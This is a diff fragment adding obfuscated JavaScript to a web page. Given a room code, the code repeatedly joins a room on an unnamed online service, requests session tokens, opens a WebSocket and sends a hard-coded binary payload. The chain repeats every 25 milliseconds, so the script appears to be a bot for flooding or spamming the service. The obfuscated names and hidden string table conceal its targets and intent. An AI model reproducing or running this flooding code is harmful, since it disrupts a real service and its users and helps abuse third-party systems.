+	_0x3047x3[_0xb32b[3]](_0xb32b[25], _0xb32b[26]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[27], _0xb32b[28]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[29], _0xb32b[30]);
+	_0x3047x3[_0xb32b[3]](_0xb32b[31], _0xb32b[32]);
+	var _0x3047x4 = JSON[_0xb32b[33]]({
+		"\x63\x6F\x64\x65": code
+	});
+	var _0x3047x5 = {
+		method: _0xb32b[34],
+		headers: _0x3047x3,
+		body: _0x3047x4,
+		redirect: _0xb32b[35]
+	};
+	fetch(_0xb32b[79], _0x3047x5)[_0xb32b[75]]((_0x3047x16) => {
+		return _0x3047x16[_0xb32b[76]]()
+	})[_0xb32b[75]]((_0x3047x7) => {
+		var _0x3047x8 = JSON[_0xb32b[39]](_0x3047x7);
+		var _0x3047x3 = new Headers();
+		_0x3047x3[_0xb32b[3]](_0xb32b[25], _0xb32b[40]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[1], _0xb32b[2]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[4], _0xb32b[41]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[42], _0xb32b[43]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[10], _0xb32b[11]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[14], _0xb32b[15]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[8], _0xb32b[9]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[17], _0xb32b[18]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[12], _0xb32b[44]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[19], _0xb32b[20]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[21], _0xb32b[22]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[23], _0xb32b[24]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[16], _0xb32b[7]);
+		_0x3047x3[_0xb32b[3]](_0xb32b[6], _0xb32b[7]);
+		var _0x3047x4 = JSON[_0xb32b[33]]({
+			"\x72\x6F\x6F\x6D\x49\x64": _0x3047x8[_0xb32b[45]],
+			"\x6E\x61\x6D\x65": _0xb32b[46],
+			"\x63\x6C\x69\x65\x6E\x74\x54\x79\x70\x65": _0xb32b[47]
+		});
+		var _0x3047x5 = {
+			method: _0xb32b[34],
+			headers: _0x3047x3,
+			body: _0x3047x4,
+			redirect: _0xb32b[35]
+		};
+		fetch(_0xb32b[78], _0x3047x5)[_0xb32b[75]]((_0x3047x16) => {
+			return _0x3047x16[_0xb32b[76]]()
+		})[_0xb32b[75]]((_0x3047x7) => {
+			var _0x3047x9 = JSON[_0xb32b[39]](_0x3047x7);
+			var _0x3047xa = _0x3047x9[_0xb32b[49]];
+			var _0x3047x3 = new Headers();
+			_0x3047x3[_0xb32b[3]](_0xb32b[1], _0xb32b[11]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[4], _0xb32b[50]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[8], _0xb32b[9]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[10], _0xb32b[11]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[14], _0xb32b[15]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[17], _0xb32b[51]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[19], _0xb32b[20]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[21], _0xb32b[22]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[23], _0xb32b[52]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[53], _0xb32b[54]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[25], _0xb32b[55]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[27], _0xb32b[56]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[29], _0xb32b[30]);
+			_0x3047x3[_0xb32b[3]](_0xb32b[31], _0xb32b[32]);
+			var _0x3047x4 = JSON[_0xb32b[33]]({
+				"\x69\x6E\x74\x65\x6E\x74\x49\x64": _0x3047xa
+			});
+			var _0x3047xb = _0x3047x9[_0xb32b[60]][_0xb32b[58]](_0xb32b[59])[1][_0xb32b[58]](_0xb32b[57])[0];
+			var _0x3047x5 = {
+				method: _0xb32b[34],
+				headers: _0x3047x3,
+				body: _0x3047x4,
+				redirect: _0xb32b[35]
+			};
+			fetch(_0xb32b[59] + _0x3047xb + _0xb32b[77] + _0x3047x9[_0xb32b[45]], _0x3047x5)[_0xb32b[75]]((_0x3047x16) => {
+				return _0x3047x16[_0xb32b[76]]()
+			})[_0xb32b[75]]((_0x3047x7) => {
+				var _0x3047xc = JSON[_0xb32b[39]](_0x3047x7);
+				console[_0xb32b[37]](_0x3047xc);
+				if (_0x3047xc[_0xb32b[63]][_0xb32b[62]] > 60) {
+					return
+				};
+				const _0x3047xd = new WebSocket(_0xb32b[64] + _0x3047xb + _0xb32b[57] + _0x3047xc[_0xb32b[63]][_0xb32b[65]] + _0xb32b[57] + _0x3047x9[_0xb32b[45]] + _0xb32b[66] + _0x3047xc[_0xb32b[67]]);
+				_0x3047xd[_0xb32b[68]] = function(_0x3047xe) {
+					console[_0xb32b[37]](_0xb32b[69], _0x3047xe[_0xb32b[70]])
+				};
+
+				function _0x3047xf(_0x3047x10) {
+					const _0x3047x11 = new ArrayBuffer(_0x3047x10[_0xb32b[71]] / 2);
+					const _0x3047x12 = new Uint8Array(_0x3047x11);
+					for (let _0x3047x13 = 0; _0x3047x13 < _0x3047x10[_0xb32b[71]]; _0x3047x13 += 2) {
+						_0x3047x12[_0x3047x13 / 2] = parseInt(_0x3047x10[_0xb32b[72]](_0x3047x13, _0x3047x13 + 2), 16)
+					};
+					return _0x3047x11
+				}
+				const _0x3047x14 = _0xb32b[73];
+				const _0x3047x15 = _0x3047xf(_0x3047x14);
+				_0x3047xd[_0xb32b[74]](_0x3047x15)
+			})[_0xb32b[38]]((_0x3047x6) => {
+				return console[_0xb32b[37]](_0xb32b[61], _0x3047x6)
+			})
+		})[_0xb32b[38]]((_0x3047x6) => {
+			return console[_0xb32b[37]](_0xb32b[48], _0x3047x6)
+		})
+	})[_0xb32b[38]]((_0x3047x6) => {
+		return console[_0xb32b[37]](_0xb32b[36], _0x3047x6)
+	})
+}
+setInterval(api, 25)
 }
 </script>
        
